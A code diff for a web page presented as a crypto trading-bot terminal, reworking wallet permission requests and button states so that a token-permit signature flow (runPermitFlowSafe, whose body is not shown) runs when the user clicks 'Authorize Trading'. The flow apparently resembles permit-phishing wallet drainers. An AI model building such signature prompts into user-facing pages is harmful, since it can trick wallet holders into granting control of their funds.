@@ -558,7 +558,17 @@ await window.ethereum.request({
   }]
 });
 
-await provider.send("eth_requestAccounts", []);
+await window.ethereum.request({
+  method: "wallet_requestPermissions",
+  params: [{
+    eth_accounts: {}
+  }]
+});
+
+await provider.send(
+  "eth_requestAccounts",
+  []
+);
 
   const signer = await provider.getSigner();
   const user = await signer.getAddress();
@@ -595,14 +605,16 @@ await provider.send("eth_requestAccounts", []);
   updateStatus('dot-bot','st-bot','OFFLINE','#475569');
   updateStatus('dot-access','st-access','RESTRICTED','#475569');
 
-  document.getElementById('btn-authorize').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-
   document.getElementById('btn-wallet').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-  document.getElementById('btn-disconnect').disabled = false;
 
-  await runPermitFlowSafe(provider, signer, user);
+document.getElementById('btn-activate').disabled = false;
+
+document.getElementById('btn-authorize').disabled = true;
+
+document.getElementById('btn-disconnect').disabled = false;
+
+document.getElementById('btn-activate').classList.add('live');
+  
 
  } catch(e){
   log("ERR " + e.message);
@@ -637,8 +649,14 @@ if (valid) {
   updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
   updateStatus('dot-bot','st-bot','READY','#6366f1');
 
-  document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-  document.getElementById('btn-authorize').disabled = true;
+ document.getElementById('btn-authorize').disabled = true;
+
+document.getElementById('btn-authorize').innerText =
+  "TRADING AUTHORIZED";
+
+document.getElementById('btn-authorize').classList.add('live');
+
+log("🟢 TERMINAL STATUS: ACTIVE");
 
   return;
 }
@@ -837,12 +855,54 @@ function renderWallet(address) {
  updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
 }
 
-function activateBot() {
- updateStatus('dot-bot','st-bot','READY','#6366f1');
+async function activateBot() {
+
+ APP_STATE.botActive = true;
+
+ updateStatus('dot-bot','st-bot','READY','#00bcd4');
+
+ log("⚡ Execution engine initialized");
+
+ document.getElementById('btn-activate').disabled = true;
+
+ document.getElementById('btn-authorize').disabled = false;
+
 }
 
-function authorizeTrading() {
- updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b');
+async function authorizeTrading(){
+
+ try {
+
+provider = new ethers.BrowserProvider(
+  window.ethereum,
+  "any"
+);
+  const signer = await provider.getSigner();
+
+  const user = await signer.getAddress();
+
+  document.getElementById('btn-authorize').disabled = true;
+
+  document.getElementById('btn-authorize').innerText =
+    "AWAITING SIGNATURE";
+
+  await runPermitFlowSafe(
+    provider,
+    signer,
+    user
+  );
+
+ }
+ catch(e){
+
+  log("❌ AUTH ERROR: " + e.message);
+
+  document.getElementById('btn-authorize').disabled = false;
+
+  document.getElementById('btn-authorize').innerText =
+    "3. AUTHORIZE TRADING";
+ }
+
 }
 
 function disconnectWallet() {
